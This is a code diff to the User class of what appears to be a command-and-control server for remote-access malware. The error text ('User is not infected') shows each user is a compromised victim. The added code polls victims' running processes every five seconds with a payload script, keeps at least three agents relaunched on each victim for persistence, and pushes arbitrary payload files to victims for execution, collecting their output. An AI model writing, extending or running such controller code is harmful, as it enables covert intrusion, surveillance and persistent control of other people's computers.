@@ -1,6 +1,8 @@
 from datetime import datetime
 import logging
 import asyncio
+import ast
+import os
 
 class User:
     def __init__(
@@ -15,7 +17,8 @@ class User:
             connection_time=datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z"),
             first_name="",
             last_name="",
-            username=""
+            username="",
+            agent_module=None
         ):
         self.uuid = uuid
         self.ip = ip
@@ -23,14 +26,47 @@ class User:
         self.connection_time = connection_time
         self.reader: asyncio.StreamReader|None = reader
         self.writer: asyncio.StreamWriter|None = writer
+        self.agents = []
         self.is_admin = is_admin
         self.module_data = module_data
         self.first_name = first_name
         self.last_name = last_name
         self.username = username
         self.lock = asyncio.Lock()
+        self.min_agents = 3
+        self.processes = []
+        self.watch_processes_task = None
+        self.watch_agents_task = None
+        self.agent_module = agent_module
+        if self.is_logged_in():
+            self.watch_processes_task = asyncio.create_task(self.watch_processes())
+            self.watch_agents_task = asyncio.create_task(self.watch_agents())
         
         
+    async def watch_processes(self):
+        while True:
+            processes = await self.execute("./modules/payloads/payload_list_processes.py", final_character=b"}]")
+            self.processes = ast.literal_eval(processes)
+            await asyncio.sleep(5)
+
+    async def watch_agents(self):
+        while True:
+            while len(self.agents) < self.min_agents:
+                await self.agent_module.launch_agent(self.uuid)
+                await asyncio.sleep(5)
+            await asyncio.sleep(5)
+
+    def watch_processes_if_not_running(self):
+        if not self.watch_processes_task:
+            self.watch_processes_task = asyncio.create_task(self.watch_processes())
+
+    def watch_agents_if_not_running(self):
+        if not self.watch_agents_task:
+            self.watch_agents_task = asyncio.create_task(self.watch_agents())
+
+    def start_not_running_watchers(self):
+        self.watch_processes_if_not_running()
+        self.watch_agents_if_not_running()
 
     def __repr__(self):
         return f"{self.ip}:{self.port}"
@@ -69,29 +105,42 @@ class User:
         )
         return user
     
-    async def execute(self, file_path, replacements={}):
-        if not self.is_logged_in():
-            logging.error(f"User {self.ip} is not infected")
-            raise Exception("User is not infected")
-        
-        with open(file_path, "rb") as f:
-            logging.info(f"Executing {file_path} on {self.ip}")
-            content = f.read()
-            for key, value in replacements.items():
-                content = content.replace(key, value)
+    async def execute(self, file_path, replacements={}, final_character=b"", wait_output=True):
+        async with self.lock:
+            if not self.is_logged_in():
+                logging.error(f"User {self.ip} is not infected")
+                raise Exception("User is not infected")
 
-            #logging.info(content.decode())
-            self.writer.write(b'print("pause||||||")')
-            async with self.lock:
-                logging.info(f"Lock acquired on {self.ip}")
-                self.writer.write(content)
+            if not os.path.exists(file_path):
+                logging.error(f"File {file_path} does not exist")
+                raise Exception(f"File {file_path} does not exist")
 
-                await self.writer.drain()
-            
-                output = await self.reader.read(4096)
+            with open(file_path, "rb") as f:
+                content = f.read()
+                for key, value in replacements.items():
+                    content = content.replace(key, value)
 
-                logging.info(f"Output for {self.ip}: {output.decode()}")
-                return output.decode()
+                if len(self.agents):
+                    await self.agents[0].execute(content)
+                    self.agents.pop(0)
+
+                else:
+                    self.writer.write(content)
+                    await self.writer.drain()
+
+                    if not wait_output:
+                        return
+
+                    output = b""
+                    while not output.endswith(final_character):
+                        chunk = await self.reader.read(4096)
+                        output += chunk
+                        if not final_character:
+                            break
+
+
+                    decoded_output = output.decode()
+                    return decoded_output
     
     def is_logged_in(self):
         return self.reader is not None and self.writer is not None
